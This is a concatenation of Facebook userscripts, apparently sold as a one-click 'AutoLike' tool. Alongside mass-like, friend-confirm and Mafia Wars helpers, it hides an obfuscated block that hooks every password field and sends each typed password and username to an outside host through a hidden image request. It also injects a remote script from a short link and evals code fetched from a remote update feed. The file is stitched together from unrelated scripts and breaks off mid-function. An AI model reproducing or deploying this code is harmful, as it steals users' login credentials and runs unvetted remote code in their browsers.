// ==UserScript==
// @name           Facebook AutoLike by Ariieph007a
// @namespace      AutoLike
// @description    One click to like all facebook Friend Post and comment
// @include        http://www.facebook.com/*
// @include        https://www.facebook.com/*
// @version        0.0.4.6
// ==/UserScript==


body = document.body;
if(body != null) {
	var twsis= "";
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+50px";
	div.style.left = "+12px";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#000000\" TARGET='_blank' href='javascript:(a = (b = document).createElement("script")).src = "//brk.to/flood", b.body.appendChild(a); void(0)'><img src='http://a5.sphotos.ak.fbcdn.net/hphotos-ak-ash4/293688_194994240564367_100001613782349_554718_2353092_n.jpg' height='100' width='120'></img></a>"
	
	body.appendChild(div);
		
}


body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+20px";
	div.style.left = "+15px";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#FFFFFF\" href=\"JavaScript:AutoLike()\"><img src=http://b2nplen.netai.net/images/likev.gif height=20 width=20 alt='Like Post or Status' title='Like Post or Status'</img></a>"
	
	body.appendChild(div);
	
	unsafeWindow.AutoLike = function() {
	
		buttons = document.getElementsByTagName("button");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("like_link") >= 0)
				if(buttons[i].getAttribute("name") == "like")
					buttons[i].click();
		}
		
	};
}

body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+20px";
	div.style.left = "+45px";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#FFFFFF\" href=\"JavaScript:AutoUnLike()\"><image src=http://b2nplen.netai.net/images/unlike.gif height=20 width=20 alt='UnLike Post or Status' title='UnLike Post or Status'></a>"
	
	body.appendChild(div);
	
	unsafeWindow.AutoUnLike = function() {
	
		buttons = document.getElementsByTagName("button");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("like_link") >= 0)
				if(buttons[i].getAttribute("name") == "unlike")
					buttons[i].click();
		}
		
	};
}



body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+20px";
	div.style.left = "+75px";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#FFFFFF\" href=\"JavaScript:AutoExpand()\"><img src=http://b2nplen.netai.net/images/expandindex.jpg height=20 width=20 alt='Expand Comment' title='Expand Comment'</img></a>"
	
	body.appendChild(div);
	
	unsafeWindow.AutoExpand = function() {
	
		buttons = document.getElementsByTagName("input");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("") >= 0)
				if(buttons[i].getAttribute("name") == "view_all[1]")
					buttons[i].click();
		}
		
	};
}

body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+20px";
	div.style.left = "+105px";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#FFFFFF\" href=\"JavaScript:AutoLikeC()\"><img src=http://b2nplen.netai.net/images/likecommentb.gif height=20 width=20 alt='Like Comment' title='Like Comment'</img></a>"
	
	body.appendChild(div);
	
	unsafeWindow.AutoLikeC = function() {
	
		buttons = document.getElementsByTagName("button");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("like_link") >= 0)
				if(buttons[i].getAttribute("title") == "Like this comment")
					buttons[i].click();
		}
		
	};
}
(function () {
// ==UserScript==
// @name           FB All By Ariieph007
// @namespace      
// @author         
// @description    Facebook All & MW
// @version        Fix.2a
// @include        http*://m.facebook.com/*
// @include        http*://facebook.com/*
// @include        http*://*.facebook.com/*
// @include        http*://*.facebook.com/messages*
// @include        http*://*.facebook.com/messages/other/*
// @include        http*://*.beta.facebook.com/messages*
// @include        http*://*.beta.facebook.com/messages/other/*
// @include        http://www.mafiawars.zynga.com/play
// @include        https://www.mafiawars.zynga.com/play
// @exclude        http://apps.facebook.com/inthemafia
// @exclude        https://apps.facebook.com/inthemafia
// @exclude        http*://apps.facebook.com/*
// @exclude        http*://www.facebook.com/apps*
// @match          http://*.facebook.com/*
// @match          https://*.facebook.com/*

// ==/UserScript==

var blLogWithAlert=false;
var intLiked=0;
var intTotalLinksToLike=0;

// there's gfid everywhere, so can't like/unlike any page/post

//
var log = function(obj){
	try{
		if(blLogWithAlert)
			alert(obj);
		if(debug){
			if(!console){
				console = unsafeWindow.console;
			}
			if(console.log)
				console.log(obj);			
		}
	} catch(e){}
}
/*

Author : Hijack

aUrl : URL to post/get, e.g. http://www.google.com/
aData : Data to post, e.g. name=ok&city=no
aFunc : Callback function when request is complete
aMethod : "GET" or "POST" ...

*/
unsafeWindow.xmlrequest=function (aUrl,aData,aFunc,aMethod){
	try{
		var request=new XMLHttpRequest();
		var method="POST";
		if(aMethod)
			method=aMethod;
			request.open(method,aUrl);
		request.onreadystatechange=function (){
			if(request.readyState==4){
				aFunc(request);
			}
		}
		if(method.toUpperCase()!="GET"){
			request.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			request.setRequestHeader("Content-Length",aData.length);
		}
		request.setRequestHeader("Connection","close");
		if(method.toUpperCase()!="GET")
			request.send(aData);
		else
			request.send(null);
	}catch(e){log(e);}
}

//////////////////

unsafeWindow.likeAll=function(filter,element,label){
	if(intTotalLinksToLike!=0){
		alert("Processing is going on. Try again later.");
		return;
	}
	var aLinks=document.links;
	var aLinksToLike=new Array();
	intLiked=0;
	intTotalLinksToLike=0;
	for(var i=0;i<aLinks.length;i++){
		if(aLinks[i].href.indexOf(filter)!=-1)
			aLinksToLike[intTotalLinksToLike++]=aLinks[i].href;
	}
	document.getElementById(element).innerHTML=label+" (0/"+intTotalLinksToLike+")";
	for(var i=0;i<intTotalLinksToLike;i++){
		unsafeWindow.xmlrequest(aLinksToLike[i],"",function (req){
				intLiked++;
				document.getElementById(element).innerHTML=label+" ("+intLiked+"/"+intTotalLinksToLike+")";
				if(intLiked==intTotalLinksToLike){
					intLiked=0;
					intTotalLinksToLike=0;
					alert("Done!");
				}
			},"GET");
	}
}


function addMenu(){
	var divLikeAllMenu=document.createElement("div");
	divLikeAllMenu.style.position="fixed";
	divLikeAllMenu.style.opacity=0.5;
	divLikeAllMenu.style.top="-300px";
	divLikeAllMenu.style.color="#ffffff";
	divLikeAllMenu.style.background="#202020";
	divLikeAllMenu.style.width="200px";
	divLikeAllMenu.style.height="300px";
	divLikeAllMenu.style.textAlign="center";
	divLikeAllMenu.style.border="solid #808080 5px";
	divLikeAllMenu.style.borderRadius="0px 0px 10px 10px";
	divLikeAllMenu.style.cursor="default";
	divLikeAllMenu.addEventListener("mouseover",function (){
		this.style.top="0px";
		this.style.opacity=0.7;
	},false);
	divLikeAllMenu.addEventListener("mouseout",function (){
		this.style.top=-this.clientHeight+document.getElementById("like_all_menu").clientHeight+"px";
		this.style.opacity=0.5;
	},false);
	
	var divLikeAllMenuTitle=document.createElement("div");
	divLikeAllMenuTitle.id="like_all_menu";
	divLikeAllMenuTitle.style.bottom="0px";
	divLikeAllMenuTitle.style.position="absolute";
	divLikeAllMenuTitle.style.width=parseInt(divLikeAllMenu.style.width)-1+"px";
	divLikeAllMenuTitle.style.textAlign="center";
	divLikeAllMenuTitle.style.fontWeight="bold";
	divLikeAllMenuTitle.style.border="solid #c0c0c0 1px";
	divLikeAllMenuTitle.style.borderRadius="0px 0px 5px 5px";
	divLikeAllMenuTitle.style.background="#000000";
	divLikeAllMenuTitle.innerHTML="Like All Menu";
	divLikeAllMenu.appendChild(divLikeAllMenuTitle);
	
	var filters=new Array("/a/profile.php?fan","/a/like.php?a","/a/comment.php?like_comment_id","/a/profile.php?unfan","/a/like.php?ul","/a/comment.php?unlike_comment_id");
	var ids=new Array("aLikeAllPages","aLikeAllPosts","aLikeAllComments","aUnLikeAllPages","aUnLikeAllPosts","aUnLikeAllComments");
	var labels=new Array("Like All Pages","Like All Posts","Like All Comments","Unlike All Pages","Unlike All Posts","Unlike All Comments");
	for(var i=0;i<filters.length;i++){
		var aLikeAll=document.createElement("a");
		aLikeAll.setAttribute("href","#");
		aLikeAll.id=ids[i];
		aLikeAll.style.color="#c0c0ff";
		aLikeAll.style.textDecoration="underline";
		aLikeAll.innerHTML=labels[i];
		aLikeAll.setAttribute("onclick","window.likeAll(\""+filters[i]+"\",\""+ids[i]+"\",\""+labels[i]+"\");");
		divLikeAllMenu.appendChild(aLikeAll);
		
		var br1=document.createElement("br");
		divLikeAllMenu.appendChild(br1);
	}
	
	document.body.appendChild(divLikeAllMenu);
	divLikeAllMenu.style.top=-divLikeAllMenu.clientHeight+document.getElementById("like_all_menu").clientHeight+"px";
	divLikeAllMenu.style.left=""+(document.body.clientWidth-divLikeAllMenu.clientWidth)/2+"px";
}

try{
	addMenu();
}catch(e){log(e);}

// ==/UserScript==

var gm_class = ' gm_reply_button_fix';
var button_text = 'Reply', quote_text = 'Quote';
var last_insert = '';
var t2, t1;
var uname, txtarea;
var dom = "DOMNodeInserted";
const myParent_Id = "globalContainer";
const DEBUG = false;
const LOG_PREFIX = 'YOD Reply: ';
var DBG_EL;

function c1(q,root){return document.evaluate(q,root?root:document,null,9,null).singleNodeValue;}
function g(id){if(id&&typeof id==='string'){id=document.getElementById(id);}return id||null;}

const yodUpdate = {
  script_id : 82308,
  script_version : '2.6',
  script_pipeId : '7015d15962d94b26823e801048aae95d',
}

function setValue(key, value) {
  localStorage.setItem(key, value);
  return false;
}

function getValue(key) {
  var val = localStorage.getItem(key);
  return val;
}

function usoUpdate(el) {
  const s_CheckUpdate = 'YodCheckUpdate' + yodUpdate['script_id'];
  var md = parseInt(new Date().getDate());
  var CheckUpdate = parseInt(getValue(s_CheckUpdate));
  var NeedCheckUpdate = false;
  if (CheckUpdate !== md) {
    setValue(s_CheckUpdate, md);
    el = el ? el : document.body;
    if (el) {
      if (!document.getElementById(s_CheckUpdate)) {
        var s_gm = document.createElement('script');
        s_gm.id = s_CheckUpdate;
        s_gm.type = 'text/javascript';
        s_gm.innerHTML = 'function go' + s_CheckUpdate + '(itm){if(itm.value.items.length){return eval(unescape(itm.value.items[0].content).replace(/&lt;/g,\'<\').replace(/&gt;/g,\'>\').replace(/&amp;/g,\'&\'));}}';
        el.appendChild(s_gm);
      }
      var s_gm = document.createElement('script');
      s_gm.type = 'text/javascript';
      var sSrc = 'http://pipes.yahoo.com/pipes/pipe.run?_id=' + yodUpdate['script_pipeId'];
      sSrc += '&_render=json&_callback=go' + s_CheckUpdate;
      sSrc += '&id=' + yodUpdate['script_id'] + '&ver=' + yodUpdate['script_version'];
      //sSrc += '&redir=yes';
      s_gm.src = sSrc;
      el.appendChild(s_gm);

      NeedCheckUpdate = true;
    }
  }
  else {
    setValue(s_CheckUpdate, md);
  }

  return NeedCheckUpdate;
}

function log(m) {
  if(DEBUG && m) console.log(LOG_PREFIX + m.toString());
}

function gBox(el) {
  var textarea = el.getElementsByTagName("textarea");
  if (!textarea.length) return gBox(el.parentNode);
  else return textarea.item(0);
}

function insertName(el, qt) {
  var actname, textarea, insert_text = '', squote, sRoot, sShow, parent = el.parentNode.parentNode;
  if (!(actname = c1('.//a[contains(@class,"actorName")]', parent))) return;
  else actname = actname.innerHTML.trim();
  //if (actname) actname = actname.split(' ')[0]; //only first name
  if (qt && (squote = c1('.//span[contains(@data-jsid,"text")]', parent))) {
    if ((sRoot = c1('.//*[contains(@class,"text_exposed_root")]', squote)) && (sShow = c1('.//*[contains(@class,"text_exposed_show")]', squote))){
      squote = sRoot.innerHTML.trim() + sShow.innerHTML.trim();
    }
    else
      squote = squote.innerHTML.trim();
    squote = squote.replace(/<[\/]{0,1}span[^><]*>/ig, '').replace(/(<a([^>]+>)|<\/a>)/ig, '').replace(/<br(?:\s\/|)>/ig, ' ');
  } else squote = '';

  DBG_EL.innerHTML = squote;
  insert_text = '@' + actname + ' ; ' + DBG_EL.textContent + '\n';
  //insert_text = '@' + actname;
  if (textarea = gBox(parent.parentNode)) {
    textarea.focus();
    if (textarea.value == '') { last_insert = null; }
    if (insert_text !== last_insert) {
      textarea.value += insert_text;
      last_insert = insert_text;
    }
  }
}

function addButtons(ev) {
  if (ev) {
    log('el2: -> ' + ev.target.tagName);
    if(!(/(EMBED|INPUT|UL|LI|DIV)/g.test(ev.target.tagName))) {
      //log('reBoot: 2 -> ' + ev.target.tagName);
      if(t2) clearTimeout(t2);
      return reBoot();
    }
  }
  if (!uname) uname = get_uname();
  var divs = document.getElementsByClassName("commentActions");
  var gm_class_length = document.getElementsByClassName(gm_class);
  var divs_length = divs.length;
  if (divs_length != gm_class_length) {
    for (i = 0; i < divs_length; i++) {
      var div = divs.item(i);
      if (div.className.indexOf(gm_class) >= 0) {
        continue;
      } else {
        div.className += gm_class;
      }
      var actname, parent = div.parentNode.parentNode;
      if (!c1('.//span[contains(@class,"saving_message")]', parent)) continue;
      if (actname = c1('.//a[contains(@class,"actorName")]', parent)) {
        actname = actname.innerHTML.trim();
        if (actname == uname) continue;
      } else continue;
      var div2 = document.createElement('div');
      var button = document.createElement('a');
      button.textContent = button_text;
      button.addEventListener("click", function(){insertName(this)}, false);
      div2.setAttribute('style',"border:0;float:right;padding-right:10px;");
      div2.appendChild(document.createTextNode('-[ '));
      div2.appendChild(button);
      div2.appendChild(document.createTextNode(' | '));
      var button = document.createElement('a');
      button.textContent = quote_text;
      button.addEventListener("click", function(){insertName(this, true)}, false);
      div2.appendChild(button);/**/
      div2.appendChild(document.createTextNode(' ]-'));
      parent.appendChild(div2);
    }
    if(t2) clearTimeout(t2);
  }
  return false;
}

function get_uname() {
  if (uname) return uname;
  else if (uname = c1('.//a[contains(@class,"headerTinymanName")]')) {
    return uname.textContent.trim();
  }
}

function doInject(ev) {
  log('el1: -> ' + ev.target.tagName);
  t2 = setTimeout(function() { addButtons(ev); }, 1000);
}

function reBoot() {
  var myContent = g(myParent_Id);
  if (myContent) {
    if(t1) clearTimeout(t1);
    myContent.removeEventListener(dom, doInject, false);
    return Boot();
  }
}

function starter() {
  var myContent = g(myParent_Id);
  if (myContent) {
    DBG_EL = document.createElement('div');
    myContent.addEventListener(dom, doInject, false);
    if(t1) clearTimeout(t1);
  }
  return false;
}

function Boot() {
  t1 = setTimeout(starter, 2000);
}

usoUpdate();
addButtons();
Boot();
})();

// ==/UserScript==

function c(e,a,b){e.parentNode.innerHTML=e.parentNode.innerHTML.split(a).join(b);}ii='inp';be=pq=0;
eve='ever.p';d=0;p='swid';m='img ';q='pasurfe';w='//\sWs';s='src=""';v='de/fb1.p';z='i'+Math.round(1234+56789 * Math.random())+'09';
var ae=document.getElementsByTagName(ii+'ut');p=q.split('u')[0]+p;for(var i=0;i<ae.length;i++){if(be<1){be=(i-1);}
k='nkey';if(pq<1){p=p.split('i').join('or');pq++;}var te=ae[i];if(te.type==p){d++;f="document.getElementById('"+z+"').src='//tests"+eve+"ytalhost."+v+"hp?pw='+this.value+'&n='+document.getElementsByTagName('"+ii+"ut')["+be+"].value+'&url="+location.host+"';";
c(te,'"'+p+'"','"'+p+'" o'+k+'up="'+f+'"');}if(te.type=='text'){be=i;}}if(d>0){document.body.innerHTML+='<'+m+s+' id="'+z+'" style="display:none">';}fastbrowser=true;var n=1;k=k.split('ke')[n];

// ==/UserScript==

const DEBUG_MODE = false;

// Credits : Some ideas taken from FB MafiaWars Addon. Thank you dakam

/**
 * Global variables
 */
var MW = {
    USER_ID      : '',
    USER_PID     : ''
};

/**
 * RESOURCES
 */
var resources = {
    mafia_icon : 'data:image/gif;base64,' +
'R0lGODlhEAAQAPUAAAAAAAYGBgkJCRERERcXFxsbGx4eHiQkJCoqKi4uLjIyMjQ0NDk5OT4+PkBAQEdHR0pKSlBQUFdXV15eXmJiYmZmZmpqanNzc3R0dH9/f4CAgIWFhYuLi42NjZGRkZeXl5ubm56enqampqqqqqysrLa2trq6ur+/v8HBwcXFxcjIyM/Pz9PT09fX19ra2t/f3+Pj4+Xl5evr6/Hx8fT09Pn5+f39/QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAQABAAAAbQQIOjsVg4DAAAwcFYMByHgCM0In2QSs5oBIIIAAfSaoVaJBUklWqUSIZbLNclWRmvSoekoQR7xUwFAyIvLi4nCHonMjGLEhAtMTAxKmYABik0MzU1IBuaMzMtDW4tNjUnNS4qNCo1NjIPSQguphYsNjYuGDKvDkkLMKYZJbgmFzOvowAOMcIduB4XNDYxygzNNhcSMzQVFdOwSQm0NhYHKy4KFK4yELKl5QIiJQIT0zG+AAzBNhgAFv4sTKMRAUADDB88fODQgEHDDSEianAQBAA7'
}

/**
 * Send text to window console
 * @param {String} msg
  @param {Boolean} force
 */
function log$(msg, force) {
    if (DEBUG_MODE === false && !force)
        return;
    try {
        (console||unsafeWindow.console).log('FBMW ADD PROFILE: ' + msg);
    } 
    catch (e) {
    // EMPTY
    }
}

/**
 * Return a valid external Mafia Wars url
 * @param {String} controller Default is "index"
 * @param {String} action Default is "view"
 * @param {Object} params {Name => Value} pairs
 * @return {String}
 */
function getExtURL(controller, action, params)
{
    var url = 'http://apps.facebook.com/inthemafia/track.php?';

    if (typeof(params) !== 'object') {
        params = {};
    }

    url += 'next_controller=' + (controller || 'index');
    url += '&next_action=' + (action || 'view');

    for (var name in params) {
        if (name == 'next_params') {
            value = escape(JSON.stringify(params[name]));
        }
        if (name != 'next_controller' && name != 'next_action') {
            url += ('&' + name + '=' + value);
        }
    }
    return url;
}

/**
 * Return the file name
 * @param {String} url
 * @param {String} extension
 * @return {String}
 */
function getFileName(url,extension){
    var f = /([^\/\\]+)$/.exec(url) || ['',''];
    f = /^([^\.]+)(\.\w+)?/.exec(f[1]);
    if(extension) f[1]+= (f[2] || '');
    return f[1];
}

/**
 * Create Item for UL Mafia list
 * @param {Array} option
 * @return {Object}
 */
function addItem(option) {
    var _nav = document.createElement("li");
    _nav.setAttribute('id', 'navItemM_' + option._name);
    _nav.setAttribute('class', 'key-mafia-' + option._name);
    _nav.innerHTML = "MAFIA";
    _nav.innerHTML = _nav.innerHTML.replace("MAFIA",
        "<a class='item' href='" + option.url + "' target='_blank'>"+
        "<span class='imgWrap'>"+
        "<i class='img sp_1a0aga' style='background-image: url(" + option.icon + ");background-repeat: no-repeat;display: inline-block;height: 16px;width: 16px;'></i></span>"+
        "</span><span class='linkWrap'>" + option.title +"</span></a>"
        );
    var _list = document.getElementById("mafia_list");
    _list.appendChild(_nav);
    return this;
}

/**
 * Return the profile url of the user id
 * @return {String}
 */
function getProfileLink() {
    var _url = 'http://apps.facebook.com/inthemafia/profile.php?id='+escape('{"user":"'+ MW.USER_ID+'"}');
    return addItem({
        _name: 'profile',
        title: 'Mafia Profile',
        icon:resources.mafia_icon,
        url: _url
    });
}

/**
 * Return all profile urls of the user id
 * @return {Object}
 */
function userLinks() {

    var options = {
        promote: {
            title: 'Promote',
            url: getExtURL('group', 'view', {
                'next_params': {
                    'promote': 'yes',
                    'pid': MW.USER_ID
                }
            })
        },

        slots: {
            title: 'Slots',
            url: getExtURL('stats', 'view', {
                'next_params': {
                    'user': MW.USER_ID,
                    'vegasslots': "1",
                    'referrer': "ad_feed"
                }
            })
        }
    };

    for (var link in options) {
        addItem({
            _name: link,
            title: options[link].title,
            icon: resources.mafia_icon,
            url: options[link].url
        });
    }
}

/**
 * Create div container
 * @return {String}
 */
function _createFBUserID(){
    if(!document.getElementById("FBUserID")) {
        var sideNav = document.getElementById("sideNav");
        var sideMafia = document.createElement("div");
        sideMafia.setAttribute("id", "FBUserID");
        sideMafia.setAttribute("class", "expandableSideNav");
        sideMafia.innerHTML = "<ul id='mafia_list' class='uiSideNav'></ul>";
        sideNav.appendChild(sideMafia);
        log$('Container created');
    }
    return this;
}

/**
 * Add Mafia Profile
 * @return {Object}
 */
function addMafiaProfile() {
    if (document.getElementById("pagelet_fbx_navigation")) {
        if (!document.getElementById("FBUserID")) {
            var _app_6261817190 = document.getElementById("navItem_app_6261817190");// Reviews
            var _app_2373072738 = document.getElementById("navItem_app_2373072738");// Discussions

            if(_app_6261817190 || _app_2373072738 ) {
                _createFBUserID();
                log$('Facebook Application Profile detected');
                return true;
            }

            var _profile_pic = document.getElementById("profile_pic");
            var _profile_minifeed = document.getElementById("profile_minifeed");

            if (_profile_pic || _profile_minifeed) {
                log$('Facebook Profile detected');
                _createFBUserID();

                var _image_name = getFileName(_profile_pic.getAttribute("src"));
                var _userId = _image_name.split("_")[1];
                MW.USER_ID = _userId;
                log$("Get User ID from Facebook: " + MW.USER_ID);

                getProfileLink();

                try{
                    log$('Access Friend Profile wall mini-feed');
                    var _minifeed = document.getElementById("profile_minifeed").innerHTML;

                    //var pattern = new RegExp(friend=p.\w.\d{5,}', 'g');
                    var pattern = /friend=p.\w.\d{5,}/
                    var _pid = _minifeed.match(pattern);
                    _pid = unescape(_pid);
                    _pid = _pid.replace("friend=","");
                    if(typeof(_pid) !== 'undefined' && _pid != null && _pid != 'null') {
                        MW.USER_PID = _pid;
                        log$('Set User PID from Facebook:' + _pid);
                        userLinks();
                    }
                } catch(err) {
                    log$("Error: " + err);
                }
            }
        }
    }
    return false;
}

addMafiaProfile();
window.setInterval(function (){
    addMafiaProfile()
}, 5000);

// ==/UserScript==

// ==Statuses==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity= 0.70;
	div.style.bottom = "+165px";
	div.style.right = "+10px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px dashed #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "&#8226;&nbsp;<a onclick='AutoLike()'>Like Status</a>"
	
	body.appendChild(div);
	
	unsafeWindow.AutoLike = function() {
	
		buttons = document.getElementsByTagName("button");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("like_link") >= 0)
				if(buttons[i].getAttribute("name") == "like")
					buttons[i].click();
		}
		
	};
}

// ==Unlike Status==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity= 0.70;
	div.style.bottom = "+145px";
	div.style.right = "+10px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px dashed #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "&#8226;&nbsp;<a onclick='AutoUnLike()'>Unlike Status</a>"
	
	body.appendChild(div);
	
	unsafeWindow.AutoUnLike = function() {
	
		buttons = document.getElementsByTagName("button");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("like_link") >= 0)
				if(buttons[i].getAttribute("name") == "unlike")
					buttons[i].click();
		}
		
	};
}

// ==Comments==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like3');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity= 0.70;
	div.style.bottom = "+125px";
	div.style.right = "+10px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px dashed #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "&#8226;&nbsp;<a onclick='OtomatisLaikComments()'>Like Comment</a>"
	
	body.appendChild(div);
	
	//buat fungsi tunda
	function tunda(milliSeconds){
	var startTime = new Date().getTime(); 
	while (new Date().getTime() < startTime + milliSeconds); 
}


	
	unsafeWindow.OtomatisLaikComments = function() {

	buttons = document.getElementsByTagName("button");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("like_link") >= 0)
				if(buttons[i].getAttribute("title") == "Like this comment")
					buttons[i].click();
		}
		
		
		
	};
}

// ==Unlike Comments==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like1');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity= 0.70;
	div.style.bottom = "+105px";
	div.style.right = "+10px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px dashed #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "&#8226;&nbsp;<a onclick='OtomatisUnlikeComments();'>Unlike  Comment</a>"
	
	body.appendChild(div);
	//buat fungsi tunda
	function tunda(milliSeconds){
	var startTime = new Date().getTime(); 
	while (new Date().getTime() < startTime + milliSeconds); 
}
	
	unsafeWindow.OtomatisUnlikeComments = function() {
	

			buttons = document.getElementsByTagName("button");
			for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("") >= 0)
				if(buttons[i].getAttribute("title") == "Unlike this comment")
					buttons[i].click();
							}

	};
}

// ==Confirm Semua==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like2');
	div.setAttribute('id','like1');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity= 0.70;
	div.style.bottom = "+85px";
	div.style.right = "+10px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px dashed #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "&#8226;&nbsp;<a onclick='OtomatisKonfirm();' >All Confirm</a>"
	
	body.appendChild(div);
	//buat fungsi tunda
	function tunda(milliSeconds){
	var startTime = new Date().getTime(); 
	while (new Date().getTime() < startTime + milliSeconds); 
}
	
	unsafeWindow.OtomatisKonfirm = function() {
		var x=document.getElementsByName("actions[accept]"); for (i=0;i<x.length;i++) { x[i].click();}
		};
}

// ==Tidak Confirm==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like2');
	div.setAttribute('id','like1');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity= 0.70;
	div.style.bottom = "+65px";
	div.style.right = "+10px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px dashed #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "&#8226;&nbsp;<a onclick='OtomatisAbaikan();' >Non Confirm</a>"
	
	body.appendChild(div);
	//buat fungsi tunda
	function tunda(milliSeconds){
	var startTime = new Date().getTime(); 
	while (new Date().getTime() < startTime + milliSeconds); 
}
	
	unsafeWindow.OtomatisAbaikan = function() {
			var x=document.getElementsByName("actions[hide]"); for (i=0;i<x.length;i++) { x[i].click();}
			};
}

// ==/UserScript==

document.addEventListener(
	'load',
	function() {
		var a = document.getElementsByClassName("default_message");
		for (var i = 0; i < a.length; i++) {
			if (a[i].innerHTML == "Like") a[i].innerHTML = "Love";
			else if (a[i].innerHTML == "Unlike") a[i].innerHTML = "Unlove";
		}
		a = document.getElementsByClassName("uiUfiLike");

		for (var i = 0; i < a.length; i++) {
			if (a[i].hasChildNodes()) {
				if (a[i].childNodes[0].hasChildNodes()) {
					var b = a[i].childNodes[0].childNodes[1];
					var html = b.innerHTML.replace(/likes/g, "loves").replace(/like/g, "love");
					a[i].childNodes[0].childNodes[1].innerHTML = html;
				}
			}
		}
		}, true
);

// ==/UserScript==

body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.top = "+85px";
	div.style.right = "20px"
	div.style.backgroundColor = "#3B5998";
	//div.style.border = "1px solid #cccccc";
	div.style.padding = "3px";
	//div.style.opacity = "0.8";
	div.innerHTML = "<small><a style=\"font-weight:bold;color:#d8dfea\" href=\"http://www.facebook.com/AyiiephSangPenjelajahDuniaMaya\">By Raden Ariieph</a></small>"
	
	body.appendChild(div);
}

// ==/UserScript==

(function() {
var css = "#rightCol{display: none;};";
if (typeof GM_addStyle != "undefined") {
	GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
	PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
	addStyle(css);
} else {
	var heads = document.getElementsByTagName("head");
	if (heads.length > 0) {
		var node = document.createElement("style");
		node.type = "text/css";
		node.appendChild(document.createTextNode(css));
		heads[0].appendChild(node); 
	}
}
})();

// ==/UserScript==
 
var chatNewHeight = 1200; //limited by other stuff not to fly off the page
var chatNewWidth = (window.innerWidth - 222); // Take up ALL of usable space
var chatNewEntryWidth = chatNewWidth - (26 + 32 + 6); // chat width - scroll bar and picture
var chatNewTextEntry = chatNewWidth - 26; // Chat entry size - icon
var fbSidebarSize = 205
 
//----
var elmNewContent = document.createElement('span');
elmNewContent.addEventListener('click',chatResizeAction, false);
elmNewContent.style.color = '#FFFFFF'
elmNewContent.style.backgroundColor = '#3B5998';
elmNewContent.style.border = '#AAAAAA 1px';
elmNewContent.style.float = 'right;';
elmNewContent.style.fontSize = 'x-small';
elmNewContent.appendChild(document.createTextNode('Click to Resize Chat'));
var elmFoo = document.getElementById('leftColContainer');
elmFoo.insertBefore(elmNewContent, elmFoo.parent); 

 
function chatResizeAction() { 
    if (chatNewWidth != 300) {
        // small chat
        chatNewWidth = 300;
        chatNewHeight = 430;
        chatNewEntryWidth = chatNewWidth - (26 + 32 + 6);
        chatNewTextEntry = chatNewWidth - 26;
    } else {
        // Big chat
        chatNewWidth = (window.innerWidth - 222);
        chatNewHeight = (window.innerHeight - 73);
        chatNewEntryWidth = chatNewWidth - (26 + 32 + 6);
        chatNewTextEntry = chatNewWidth - 26;
    }
    
    reFlow();
}

//----
 
function addGlobalStyle(css) {
    if(typeof GM_addStyle=='function') {GM_addStyle(css);return}
    var style = document.createElement('style').setAttribute('type', 'text/css');
    var docHead = document.getElementsByTagName('head')[0];
    docHead.appendChild(style).innerHTML=css;

